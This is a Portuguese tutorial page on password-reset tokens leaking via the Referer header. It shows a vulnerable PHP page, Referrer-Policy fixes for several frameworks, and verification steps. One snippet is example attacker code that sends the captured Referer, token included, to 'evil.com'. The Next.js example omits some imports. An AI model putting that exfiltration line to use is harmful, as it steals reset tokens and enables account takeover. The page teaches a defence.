# Code Examples: Vazamento de Token no Reset de Senha

## Exemplo da aula: pagina de reset em PHP

### Pagina vulneravel (reset.php)

```html
<!-- PROBLEMA 1: CSS externo de CDN -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">

<!-- PROBLEMA 2: Links na pagina -->
<form method="POST" action="/reset-password">
  <input type="password" name="password">
  <button type="submit">Redefinir</button>
</form>

<footer>
  <a href="/privacy.php">Politica de Privacidade</a>
  <a href="/terms.php">Termos de Uso</a>
</footer>
```

A URL da pagina e algo como: `https://site.com/reset.php?token=abc123secret`

### O que acontece quando o usuario clica em "Politica de Privacidade"

O navegador faz uma requisicao para `/privacy.php` com o header:

```
Referer: https://site.com/reset.php?token=abc123secret
```

O token inteiro e enviado para o servidor que serve a politica de privacidade.

### Codigo do atacante na pagina de destino (se o CMS foi comprometido)

```php
<?php
// Atacante injeta isso na pagina de politica de privacidade
$referer = $_SERVER['HTTP_REFERER'];
// $referer contem: https://site.com/reset.php?token=abc123secret
// Atacante envia para seu servidor
file_get_contents("https://evil.com/steal?ref=" . urlencode($referer));
?>
```

### Pagina corrigida (reset.php)

```php
<?php
// ANTES de qualquer output HTML
header("Referrer-Policy: no-referrer");
?>
<!DOCTYPE html>
<html>
<head>
  <!-- CSS copiado localmente -->
  <link rel="stylesheet" href="/assets/css/pico.min.css">
</head>
<body>
  <img src="/assets/img/logo.png" alt="Logo">
  <!-- Sem link no logo -->
  
  <form method="POST" action="/reset-password">
    <input type="hidden" name="token" value="<?= htmlspecialchars($_GET['token']) ?>">
    <input type="password" name="password" required>
    <button type="submit">Redefinir senha</button>
  </form>
  
  <!-- Sem links no footer, sem analytics, sem scripts externos -->
</body>
</html>
```

## Implementacao em outros frameworks

### Express.js (Node.js)

```javascript
// Middleware especifico para rotas de autenticacao
const authPageSecurity = (req, res, next) => {
  res.setHeader('Referrer-Policy', 'no-referrer');
  next();
};

app.get('/reset-password', authPageSecurity, (req, res) => {
  res.render('reset-password', { token: req.query.token });
});

app.get('/login', authPageSecurity, (req, res) => {
  res.render('login');
});
```

### Django (Python)

```python
from django.views.decorators.cache import never_cache

def referrer_policy_no_referrer(view_func):
    def wrapper(request, *args, **kwargs):
        response = view_func(request, *args, **kwargs)
        response['Referrer-Policy'] = 'no-referrer'
        return response
    return wrapper

@never_cache
@referrer_policy_no_referrer
def reset_password(request):
    token = request.GET.get('token')
    return render(request, 'auth/reset_password.html', {'token': token})
```

### Next.js / React

```typescript
// pages/reset-password.tsx ou app/reset-password/page.tsx
import type { NextApiResponse } from 'next';

// No middleware ou no handler da pagina
export function middleware(request: NextRequest) {
  const response = NextResponse.next();
  
  if (request.nextUrl.pathname.startsWith('/reset-password') ||
      request.nextUrl.pathname.startsWith('/login') ||
      request.nextUrl.pathname.startsWith('/signup')) {
    response.headers.set('Referrer-Policy', 'no-referrer');
  }
  
  return response;
}
```

### Nginx (configuracao de servidor)

```nginx
# Para paginas especificas de autenticacao
location ~ ^/(reset-password|login|signup) {
    add_header Referrer-Policy "no-referrer" always;
    # ... demais configuracoes
}
```

## Verificacao: como confirmar que funciona

### No navegador (DevTools)

1. Abra a pagina de reset de senha
2. Va na aba Network
3. Clique em qualquer link que exista na pagina
4. Inspecione os Request Headers da requisicao
5. **Sem Referrer-Policy:** o header `Referer` mostra a URL completa com token
6. **Com Referrer-Policy: no-referrer:** o header `Referer` nao aparece

### Via curl

```bash
# Simular uma requisicao vinda da pagina de reset
# SEM protecao - o Referer e enviado pelo navegador automaticamente
curl -H "Referer: https://site.com/reset.php?token=SECRET" https://site.com/privacy.php

# Verificar se o header Referrer-Policy esta presente na resposta
curl -I https://site.com/reset-password?token=test
# Deve retornar: Referrer-Policy: no-referrer
```